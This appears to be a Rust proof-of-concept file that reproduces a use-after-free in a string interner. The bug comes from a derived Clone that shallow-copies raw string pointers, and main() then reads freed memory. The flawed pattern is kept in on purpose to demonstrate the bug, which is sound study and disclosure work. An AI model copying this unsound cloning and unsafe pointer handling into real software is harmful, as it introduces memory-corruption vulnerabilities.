// SECTION 1: MINIMAL DEPENDENCIES

use std::collections::hash_map::RandomState;
use std::collections::HashMap;
use std::hash::{BuildHasher, Hash, Hasher};
use std::num::NonZeroU32;

// --- Trait and Type definitions from the crate ---

pub trait Symbol: Copy + Ord + Eq {
    fn from_usize(val: usize) -> Self;
    fn to_usize(self) -> usize;
}

#[derive(Debug, Copy, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct Sym(NonZeroU32);

impl Symbol for Sym {
    fn from_usize(val: usize) -> Self {
        assert!(val < u32::MAX as usize);
        Sym(unsafe { NonZeroU32::new_unchecked((val + 1) as u32) })
    }

    fn to_usize(self) -> usize {
        (self.0.get() as usize) - 1
    }
}

#[derive(Debug, Copy, Clone, Eq)]
struct InternalStrRef(*const str);

impl InternalStrRef {
    fn from_str(val: &str) -> Self {
        InternalStrRef(val as *const str)
    }

    fn as_str(&self) -> &str {
        unsafe { &*self.0 }
    }
}

impl<T> From<T> for InternalStrRef where T: AsRef<str> {
    fn from(val: T) -> Self {
        InternalStrRef::from_str(val.as_ref())
    }
}

impl PartialEq for InternalStrRef {
    fn eq(&self, other: &InternalStrRef) -> bool {
        self.as_str() == other.as_str()
    }
}

impl Hash for InternalStrRef {
    fn hash<H: Hasher>(&self, state: &mut H) {
        self.as_str().hash(state)
    }
}

// SECTION 2: VULNERABLE CODE

// The vulnerability is in the derived `Clone` implementation.
// It performs a shallow copy of `map` and `values`.
// When the original `StringInterner` is dropped, its `values` (Vec<Box<str>>)
// are deallocated, leaving the cloned `map` with dangling pointers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct StringInterner<S, H = RandomState>
where
    S: Symbol,
    H: BuildHasher,
{
    map: HashMap<InternalStrRef, S, H>,
    values: Vec<Box<str>>,
}

impl<S> StringInterner<S>
where
    S: Symbol,
{
    pub fn new() -> StringInterner<S, RandomState> {
        StringInterner {
            map: HashMap::new(),
            values: Vec::new(),
        }
    }
}

impl<S, H> StringInterner<S, H>
where
    S: Symbol,
    H: BuildHasher,
{
    pub fn get_or_intern<T>(&mut self, val: T) -> S
    where
        T: Into<String> + AsRef<str>,
    {
        // This `get` call will hash and compare `val` against existing keys.
        // If a key is a dangling pointer, this will cause a UAF.
        match self.map.get(&val.as_ref().into()) {
            Some(&sym) => sym,
            None => self.intern(val),
        }
    }

    fn intern<T>(&mut self, new_val: T) -> S
    where
        T: Into<String> + AsRef<str>,
    {
        let new_id: S = self.make_symbol();
        let new_boxed_val = new_val.into().into_boxed_str();
        let new_ref: InternalStrRef = new_boxed_val.as_ref().into();
        self.values.push(new_boxed_val);
        self.map.insert(new_ref, new_id);
        new_id
    }

    fn make_symbol(&self) -> S {
        S::from_usize(self.values.len())
    }
}

// SECTION 3: PROOF-OF-CONCEPT

pub type DefaultStringInterner = StringInterner<Sym>;

fn clone_and_drop() -> (DefaultStringInterner, Sym) {
    let mut old = DefaultStringInterner::new();
    let foo = old.get_or_intern("foo");

    let new = old.clone();

    // Drop old. At this point, the Box<str> for "foo" is dropped.
    // The `InternalStrRef` in `new.map` now points to freed memory.
    drop(old);

    (new, foo)
}

fn main() {
    let (mut new, foo) = clone_and_drop();

    // Trigger UAF: get_or_intern("foo") looks up "foo" in the map.
    // The HashMap must compare the input "foo" with the existing key.
    // To do this, it calls `as_str()` on the dangling `InternalStrRef`,
    // dereferencing a dangling pointer to read the freed string.
    assert_eq!(
        new.get_or_intern("foo"),
        foo,
        "`foo` should represent the string \"foo\" so they should be equal"
    );
}